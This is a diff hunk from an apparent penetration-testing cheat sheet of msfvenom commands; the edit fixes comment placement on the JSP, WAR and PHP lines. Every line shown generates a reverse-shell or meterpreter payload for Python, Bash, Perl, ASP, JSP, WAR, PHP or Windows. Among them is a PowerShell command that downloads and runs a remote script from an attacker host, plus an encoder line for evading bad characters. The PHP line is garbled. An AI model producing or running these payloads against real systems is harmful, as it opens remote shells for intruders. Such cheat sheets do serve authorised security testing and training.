@@ -38,9 +38,9 @@ msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw > shell.py  #Pyth
 msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh  #BASH Shell 
 msfvenom -p cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw > shell.pl  #PERL Shell 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp  #ASP Meterpreter shell 
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > #shell.jsp  JSP Shell 
- msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > #shell.war  WAR Shell 
- msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw > #shell.php cat shell.php  pbcopy && echo '?php '  tr -d '\n' shell.php && pbpaste shell.php  Php Meterpreter Shell 
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp  #JSP Shell 
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war  #WAR Shell 
+msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.php cat shell.php  pbcopy && echo '?php '  tr -d '\n' shell.php && pbpaste shell.php  #Php Meterpreter Shell 
  msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw > phpreverseshell.php  #Php Reverse Shell 
  msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \\"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f python  #Windows Exec Nishang Powershell in python 
  msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b "\x04\xA0"  #Bad characters shikata_ga_nai 
